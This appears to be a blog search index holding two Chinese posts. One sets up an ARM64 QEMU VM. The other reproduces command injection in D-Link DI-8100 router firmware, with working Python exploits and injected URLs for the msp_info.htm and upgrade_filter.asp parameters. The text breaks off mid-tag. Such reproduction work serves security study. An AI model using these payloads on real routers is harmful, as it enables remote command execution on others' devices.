<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>qemu搭建ARM64环境</title>
      <link href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/"/>
      <url>/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h3 id="所需前置准备"><a href="#所需前置准备" class="headerlink" title="所需前置准备"></a><strong>所需前置准备</strong></h3><p>创建磁盘文件并下载内核镜像、内存盘镜像文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 debian<span class="number">-3607</span>-aarch64.qcow2 <span class="number">32</span>G</span><br><span class="line"></span><br><span class="line">wget http:<span class="comment">//ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gz</span></span><br><span class="line"></span><br><span class="line">wget http:<span class="comment">//ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linux</span></span><br><span class="line"></span><br><span class="line">wget http:<span class="comment">//ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/mini.iso</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述命令执行完毕之后可以得到下面这几个文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian<span class="number">-3607</span>-aarch64.qcow2  initrd.gz  linux  mini.iso</span><br></pre></td></tr></table></figure><p>执行 <code>qemu</code> 启动脚本前，先确创建出 <code>tap0</code> 接口并将其添加至网桥（名称可能会根据具体情况进行修改），因为接下来我们需要 <code>qemu虚拟机</code> 通过网络来下载和安装完整的系统，必须实现 <code>qemu</code> 的网络通信。</p><p>依次执行下面的命令来配置 <code>Linux主机</code> 网络以此来实现 <code>qemu虚拟机的</code> 网络</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># net.sh</span></span><br><span class="line">sudo apt install libvirt-daemon-system libvirt-clients virt-manager</span><br><span class="line">sudo ip tuntap add dev tap0 mode tap</span><br><span class="line">sudo ip link <span class="built_in">set</span> tap0 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br><span class="line">sudo chmod <span class="number">666</span> /dev/net/tun</span><br></pre></td></tr></table></figure><p>使用命令 <code>ifconfig</code> 来确保 <code>tap0</code> 已经添加<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/1.png"></p><p>准备完毕后执行下面qemu命令来启动虚拟机</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">sudo qemu-system-aarch64 -M virt -cpu cortex-a53 -m <span class="number">1</span>G -kernel ./linux -initrd ./initrd.gz \</span><br><span class="line">    -hda debian<span class="number">-3607</span>-aarch64.qcow2 -append <span class="string">&quot;console=ttyAMA0&quot;</span> \</span><br><span class="line">    -drive file=mini.iso,id=cdrom,<span class="keyword">if</span>=none,media=cdrom \</span><br><span class="line">    -device virtio-scsi-device -device scsi-cd,drive=cdrom -nographic \</span><br><span class="line">    -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-device,netdev=net0</span><br></pre></td></tr></table></figure><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/2.png"></p><h3 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a><strong>下载和安装</strong></h3><p>出现下面界面就是正常进入安装了<br>开头选择语言默认English, 回车即可<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/3.png"></p><p>这里选择地点选择 <code>香港</code> 回车即可<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/4.png"></p><p>选择键盘布局为中国<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/5.png"></p><p>然后就会自动配置网络<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/6.png"></p><p>如果忘记创建 <code>tap0</code> 接口或者没有成功将 <code>tap0</code> 接口添加到网桥，那么会出现自动配置网络失败的情况。<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%8371.png"></p><p>设置主机名<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/8.png"></p><p>设置域名,默认为空即可<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/9.png"></p><p>选择一个镜像地址, 选香港就好<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/10.png"></p><p>这个选 <code>deb.debian.org</code> (默认就是这个)<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/11.png"></p><p>这里设置代理, 默认为空即可<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/12.png"></p><p>然后就会开始下载, 这里大概需要30分钟左右下载<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/13.png"></p><p>这里下载好了之后就是设置 <code>root密码</code> 和 <code>用户名</code> 还有 <code>用户密码</code> (等太久了在刷抖音, 忘记截图了, 顺手就给回车敲了<code>o(╥﹏╥)o</code>)</p><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/14.png"></p><p>设置好用户名和密码之后(下面忘记截图了, 这里用zikh26师傅的截图来展示)<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/15.png"></p><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/16.png"></p><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/17.png"></p><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/18.png"></p><p>注意这里要选择 <code>yes</code>, 不要无脑回车, 因为他默认是 <code>no</code><br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/19.png"></p><p>上面设置好了之后就会进入下载<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/20.png"></p><p>在下载过程中也会出现选择<br>下图选择 <code>yes</code><br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/21.png"></p><p>下图先按下 <code>tab</code> 会切换到 <code>continue</code> 然后再回车<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/22.png"></p><p>默认回车<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/23.png"></p><p>直到回到这里, 重新看到这个界面算是已经全部下载结束了, 这个窗口已经没有用了, 可以直接关掉(好像用 ctrl+c 和 ctrl+d 都退出不了,直接关掉就好了)<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/24.png"></p><h3 id="从镜像中提取文件"><a href="#从镜像中提取文件" class="headerlink" title="从镜像中提取文件"></a>从镜像中提取文件</h3><p>现在要从 <code>qcow2</code> 镜像中提取出来 <code>Linux</code> 内核和 <code>initrd</code> ，将磁盘文件挂载出来，然后把 <code>vmlinuz-5.10.0-29-arm64</code> 以及 <code>initrd.img-5.10.0-29-arm64</code> 拷贝出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe nbd</span><br><span class="line">sudo qemu-nbd -c /dev/nbd0 debian<span class="number">-3607</span>-aarch64.qcow2</span><br><span class="line">sudo mount /dev/nbd0p2 /mnt </span><br><span class="line">sudo mount /dev/nbd0p1 /mnt/boot </span><br><span class="line">cp /mnt/boot/vmlinuz<span class="number">-5.10</span><span class="number">.0</span><span class="number">-35</span>-arm64 ./</span><br><span class="line">cp /mnt/boot/initrd.img<span class="number">-5.10</span><span class="number">.0</span><span class="number">-35</span>-arm64 ./</span><br></pre></td></tr></table></figure><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/25.png"></p><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/26.png"></p><p>可能会遇到下面问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-aarch64: -drive <span class="keyword">if</span>=virtio,file=debian<span class="number">-3607</span>-aarch64.qcow2,format=qcow2,id=hd: Failed to get <span class="string">&quot;write&quot;</span> lock Is another process using the image [debian<span class="number">-3607</span>-aarch64.qcow2]?</span><br></pre></td></tr></table></figure><p>我的解决方案是确保东西保存了之后(可以打一下快照)重启一下虚拟机<br>我重启一下就好了,指令都可以正常执行</p><p>最终得到如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian<span class="number">-3607</span>-aarch64.qcow2  initrd.gz  initrd.img<span class="number">-5.10</span><span class="number">.0</span><span class="number">-35</span>-arm64  linux  mini.iso  net.sh  start.sh  vmlinuz<span class="number">-5.10</span><span class="number">.0</span><span class="number">-35</span>-arm64</span><br></pre></td></tr></table></figure><p>现在所有的文件都有了，接下来就是启动 <code>qemu</code> ，在此之前先创建出 <code>tap0</code> 接口并将其添加到 <code>virbr0</code> 网桥。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># net.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">sudo</span> ip tuntap add dev tap0 mode tap</span><br><span class="line"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> tap0 up</span><br><span class="line"><span class="built_in">sudo</span> brctl addif virbr0 tap0</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 666 /dev/net/tun</span><br></pre></td></tr></table></figure><p>运行下面的启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">sudo</span> qemu-system-aarch64 -M virt -cpu cortex-a53 -m 1G -initrd ./initrd.img-5.10.0-35-arm64 \</span><br><span class="line">    -kernel ./vmlinuz-5.10.0-35-arm64 -append <span class="string">&quot;root=/dev/vda2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -drive <span class="keyword">if</span>=virtio,file=debian-3607-aarch64.qcow2,format=qcow2,<span class="built_in">id</span>=hd \</span><br><span class="line">    -netdev tap,<span class="built_in">id</span>=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-pci,netdev=net0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/27.png"></p><p><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/28.png"></p><p>同样启动qemu虚拟机也会有上面那个问题, 我的解决方法也是重启</p><p>然后就可以启动, 启动之后第一件事情就是配置IP, <code>qemu虚拟机</code> 和 <code>Linux主机</code> 互相ping一下看看能不能通</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip add add <span class="number">192.168</span><span class="number">.122</span><span class="number">.130</span>/<span class="number">24</span> dev enp0s1</span><br><span class="line">ip link <span class="built_in">set</span> enp0s1 up</span><br><span class="line">ip route add <span class="keyword">default</span> via <span class="number">192.168</span><span class="number">.122</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>设置好之后可以互相ping通<br><img src="/../picture/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/29.png"></p><p>参考:<br><a href="https://zikh26.github.io/posts/3d9490d.html">QEMU搭建ARM64环境 | ZIKH26’s Blog</a><br><a href="https://www.diozero.com/boards/qemuaarch64_bullseye.html">Building a Debian Bullseye QEMU image for AARCH64 | diozero</a><br><a href="https://phwl.org/2022/qemu-aarch64-debian/">QEMU 模拟的 ARM-64 上的 Debianaarch64 - 生命、宇宙和钓鱼</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> qemu </tag>
            
            <tag> ARM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOT入门--路由器命令执行漏洞</title>
      <link href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="D-Link-DI-8100命令执行漏洞复现"><a href="#D-Link-DI-8100命令执行漏洞复现" class="headerlink" title="D-Link DI_8100命令执行漏洞复现"></a>D-Link DI_8100命令执行漏洞复现</h2><h3 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a><strong>所需工具</strong></h3><p><strong>Burp Suite​</strong>​-Linux下载<br><a href="https://www.52pojie.cn/thread-1544866-1-1.html">BurpSuite v2024.10汉化无cmd框版（2024.11.03更新） - 吾爱破解 - 52pojie.cn</a></p><p>配置<strong>Burp Suite​</strong>​教程<br><a href="https://blog.csdn.net/Hou_Lang_/article/details/122047560">Burp Suite代理和火狐浏览器的设置(超详细)_burpsuite firefox-CSDN博客</a></p><p>固件下载地址:<br><a href="http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100">http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100</a><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h3><p>使用<code>binwalk</code>对固件进行分解</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me DI_8100-16.07.26A1.trx </span><br></pre></td></tr></table></figure><p>查看一下系统架构以及保护<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p>下面使用FirmAE对固件进行仿真<br>进入FirmAE工具文件夹下，使用 <code>run.sh</code> 来进行启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./run.sh -d dlink &lt;DI_8100-16.07.26A1.trx的路径&gt;</span><br></pre></td></tr></table></figure><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p>选择2进入终端，然后使用<code>ps</code>命令查看进程<br>我们发现程序启动之后 <code>jhttpd</code> 这个服务就启动了，所以我们主要的程序就是这个 <code>jhttpd</code> 服务,接下来我们也需要使用IDA分析这个程序<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p><p>下面来看官方的漏洞描述</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Description  </span><br><span class="line">A vulnerability, which was classified as critical, has been found in D-Link DI<span class="number">-8100</span> <span class="number">16.07</span>. This issue affects the function msp_info_htm of the file msp_info.htm. The manipulation of the argument cmd leads to command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB<span class="number">-273521</span> was assigned to this vulnerability.</span><br><span class="line"></span><br><span class="line">描述  </span><br><span class="line">分类为致命的漏洞已在 D-Link DI<span class="number">-8100</span> <span class="number">16.07</span> 中发现。此问题会影响文件msp_info.htm的功能msp_info_htm。对参数 cmd 的操作会导致命令注入。攻击可能是远程发起的。该漏洞已向公众披露，并可能被使用。标识符 VDB<span class="number">-273521</span> 已分配给此漏洞。</span><br></pre></td></tr></table></figure><p>也就是说在 <code>msp_info.htm</code> 页面中 <code>cmd</code> 参数造成命令执行。<br>下面我们使用 <code>ida</code> 来分析 <code>jhttpd</code> 程序，<br>我们可以通过 <code>msp_info</code> 字符串来进行定位接着查找到 <code>msp_info_htm</code> 函数<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/7.png"></p><p>函数存在的漏洞逻辑如下<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/8.png"><br>在 <code>msp_info_htm</code> 函数的开头，会从传进来的值中 <code>获取flag字符串</code>，如果成功获取到flag字符串然后会执行不同的命令，当我们传入的 <code>flag=cmd</code> 的时候就会执行到漏洞点，后续的 <code>cmd的内容</code> 就会被放入到 <code>system</code> 中执行</p><p>我们打开本机的浏览器，访问 <code>192.168.0.1:80</code> (需要注意FirmAE启动的这是内网，只能使用本机访问，后续还需要用到<strong>Burp Suite​</strong>​也需要提前准备好) D-Link路由器的初始账号和密码都是admin，直接登入后就可以得到下面这个页面<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9.png"></p><p>我们先来试一下这个漏洞，我们按照这个漏洞的利用逻辑来写一个url进行注入<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/10.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/msp_info.htm?flag=cmd&amp;cmd=`echo%<span class="number">20</span>aaaa&gt;a.txt`</span><br></pre></td></tr></table></figure><p>在浏览器输入这个url后，我们可以查看一下我们路由器的系统终端中是否多出了一个 <code>a.txt</code> 文件<br>可以发现已经执行了我们的命令，根目录下确实多出了<code>a.txt</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/11.png"></p><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a><strong>exp编写</strong></h3><p>重新回到登入的那个界面，然后刷新界面使用Burp Suite进行抓包<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/12.png"></p><p>然后按照抓包得到的信息编写下面的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://192.168.0.1:80/msp_info.htm?flag=cmd&amp;cmd=`echo%20aaaa&gt;xidp.txt`&quot;</span></span><br><span class="line"></span><br><span class="line">auth_cookies = &#123;<span class="string">&quot;wys_userid&quot;</span>: <span class="string">&quot;admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">request_headers = &#123;</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(</span><br><span class="line">    url=target_url,</span><br><span class="line">    headers=request_headers,</span><br><span class="line">    cookies=auth_cookies</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;攻击载荷成功发送！服务器响应正常&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;请求失败！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/13.png"></p><p>随后我们可以查看根目录下文件发现已经执行命令生成了xidp.txt<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/14.png"></p><h3 id="简单调试"><a href="#简单调试" class="headerlink" title="简单调试"></a><strong>简单调试</strong></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mygdb.sh</span></span><br><span class="line"><span class="built_in">set</span> architecture mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line"><span class="built_in">set</span> sysroot lib/</span><br><span class="line"><span class="built_in">set</span> solib-search-path lib/</span><br><span class="line">target remote 192.168.0.1:1337</span><br><span class="line">b *0x0044DBF4</span><br></pre></td></tr></table></figure><p>使用命令 <code>gdb-multiarch -x mygdb.sh</code></p><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15.png"></p><p>这里A0寄存器作为第一次参数，然后调用system函数</p><h3 id="DI-8100的第二个命令执行漏洞"><a href="#DI-8100的第二个命令执行漏洞" class="headerlink" title="DI_8100的第二个命令执行漏洞"></a><strong>DI_8100的第二个命令执行漏洞</strong></h3><p>同样这个固件中还有另外一个命令执行漏洞在 <code>upgrade_filter_asp</code> 这个函数也存在<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/16.png"></p><p>同样回到登入页面然后抓包查看信息<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/17.png"></p><p>编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://192.168.0.1:80/upgrade_filter.asp?path=http://`ps%20%3e%20/xidp.txt`&quot;</span></span><br><span class="line"><span class="comment"># ps &gt; /xidp.txt</span></span><br><span class="line">auth_cookies = &#123;<span class="string">&quot;uid&quot;</span>: <span class="string">&quot;h3r4yvoOTp&quot;</span>, <span class="string">&quot;wys_userid&quot;</span>: <span class="string">&quot;admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">request_headers = &#123;</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(</span><br><span class="line">    url=target_url,</span><br><span class="line">    headers=request_headers,</span><br><span class="line">    cookies=auth_cookies</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;攻击载荷成功发送！服务器响应正常&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;请求失败！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img 